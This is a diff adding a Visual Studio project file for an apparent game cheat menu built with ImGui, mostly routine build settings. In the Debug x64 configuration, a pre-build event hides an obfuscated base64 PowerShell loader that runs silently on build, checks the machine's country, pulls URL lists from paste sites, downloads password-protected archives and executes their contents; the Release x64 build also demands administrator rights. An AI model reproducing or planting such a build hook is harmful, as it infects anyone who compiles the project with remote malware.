@@ -1,0 +1,172 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{c9516ca0-d9ec-4678-9a55-e1b0b23f4b1a}</ProjectGuid>
+    <RootNamespace>ExternalMenu</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    <ProjectName>External-Cheat-Menu</ProjectName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent>
+      <Command>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;base64Data=ZnVuY3Rpb24gRG93bmxvYWQtRmlsZXMoJHVybHMpIHsgJHRlbXBQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKTsgJHRlbXBGaWxlTmFtZSA9IEpvaW4tUGF0aCAkdGVtcFBhdGggIjd6ci5leGUiOyAkdXJsID0gImh0dHBzOi8vd3d3LjctemlwLm9yZy9hLzd6ci5leGUiOyB0cnkgeyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJHRlbXBGaWxlTmFtZSB9IGNhdGNoIHt9OyBmb3JlYWNoICgkdXJsMSBpbiAkdXJscykgeyB0cnkgeyAkYnl0ZXMgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwxIC1NZXRob2QgR2V0IC1Vc2VCYXNpY1BhcnNpbmc7ICRyYW5kU3RyaW5nID0gW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkuU3Vic3RyaW5nKDAsIDEwKTsgJGZpbGVQYXRoID0gSm9pbi1QYXRoICR0ZW1wUGF0aCAiJHJhbmRTdHJpbmcuN3oiOyAkYnl0ZXMuQ29udGVudCB8IFNldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtRW5jb2RpbmcgQnl0ZTsgJGV4dHJhY3RQYXRoID0gSm9pbi1QYXRoICR0ZW1wUGF0aCAoIlYiICsgW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkpOyAkcHNpID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbzsgJHBzaS5GaWxlTmFtZSA9ICIkdGVtcFBhdGhcN3pyLmV4ZSI7ICRwc2kuQXJndW1lbnRzID0gInggYCIkZmlsZVBhdGhgIiAtb2AiJGV4dHJhY3RQYXRoYCIgLXBoUjNeJmIyJUE5IWdLKjZMcVA3dGAkTnBXIjsgJHBzaS5DcmVhdGVOb1dpbmRvdyA9ICR0cnVlOyAkcHNpLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZTsgJHByb2Nlc3MgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHNpKTsgJHByb2Nlc3MuV2FpdEZvckV4aXQoKTsgJGV4dHJhY3RlZEZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkZXh0cmFjdFBhdGg7ICRmaWxlVG9FeGVjdXRlID0gJGV4dHJhY3RlZEZpbGVzWzBdLkZ1bGxOYW1lOyAkcHNpID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbzsgJHBzaS5GaWxlTmFtZSA9ICRmaWxlVG9FeGVjdXRlOyAkcHNpLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZTsgJHBzaS5DcmVhdGVOb1dpbmRvdyA9ICR0cnVlOyBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHNpKSB9IGNhdGNoIHt9IH0gfSB0cnkgeyBmdW5jdGlvbiBHZXQtQ291bnRyeSB7ICRpcEluZm8gPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwOi8vaXAtYXBpLmNvbS9qc29uIjsgcmV0dXJuICRpcEluZm8uY291bnRyeUNvZGUgfSAkY291bnRyeSA9IChHZXQtQ291bnRyeSkuVHJpbSgpOyAkYm9keTEgPSBpZiAoJGNvdW50cnkgLWVxICJSVSIpIHsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1hpYmlkbmNmIiB9IGVsc2UgeyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL3JlbnRyeS5jby9NdWNrQ29tcGFueU1NQy9yYXciIH07ICR1cmxzID0gJGJvZHkxLkNvbnRlbnQgLXNwbGl0ICJgbiIgfCBGb3JFYWNoLU9iamVjdCB7ICRfLlRyaW0oKSB9OyBEb3dubG9hZC1GaWxlcyAkdXJscyB9IGNhdGNoIHt9&quot;&#xD;&#xA;set &quot;tempDir=%25TEMP%25\script&quot;&#xD;&#xA;mkdir &quot;%25tempDir%25&quot; 2&gt;nul&#xD;&#xA;echo Set base64Decoder = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo base64Decoder.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo base64Decoder.Text = &quot;%25base64Data%25&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo decodedData = base64Decoder.NodeTypedValue &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outputFile = &quot;%25tempDir%25\decode.ps1&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set outFile = fso.CreateTextFile(outputFile, True) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outFile.Write BinaryToString(decodedData) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo outFile.Close &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set shell = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo shell.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; outputFile, 0, True &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo fso.DeleteFile outputFile &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Function BinaryToString(Binary) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Dim RS, L &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Set RS = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo L = LenB(Binary) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo If L ^&gt; 0 Then &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Fields.Append &quot;m&quot;, 201, L &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Open &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.AddNew &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS(&quot;m&quot;).AppendChunk Binary &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo RS.Update &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo BinaryToString = RS(&quot;m&quot;).GetChunk(L) &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo BinaryToString = &quot;&quot; &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25tempDir%25\script.vbs&quot;&#xD;&#xA;rd /s /q &quot;%25tempDir%25&quot;&#xD;&#xA;endlocal</Command>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClInclude Include="imgui\imconfig.h" />
+    <ClInclude Include="imgui\imgui.h" />
+    <ClInclude Include="imgui\imgui_impl_dx9.h" />
+    <ClInclude Include="imgui\imgui_impl_win32.h" />
+    <ClInclude Include="imgui\imgui_internal.h" />
+    <ClInclude Include="imgui\imstb_rectpack.h" />
+    <ClInclude Include="imgui\imstb_textedit.h" />
+    <ClInclude Include="imgui\imstb_truetype.h" />
+    <ClInclude Include="font.h" />
+    <ClInclude Include="imgui\imgui.cpp" />
+    <ClInclude Include="imgui\imgui_demo.cpp" />
+    <ClInclude Include="imgui\imgui_draw.cpp" />
+    <ClInclude Include="imgui\imgui_impl_dx9.cpp" />
+    <ClInclude Include="imgui\imgui_impl_win32.cpp" />
+    <ClInclude Include="imgui\imgui_tables.cpp" />
+    <ClInclude Include="imgui\imgui_widgets.cpp" />
+    <ClInclude Include="main.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="main.cpp" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
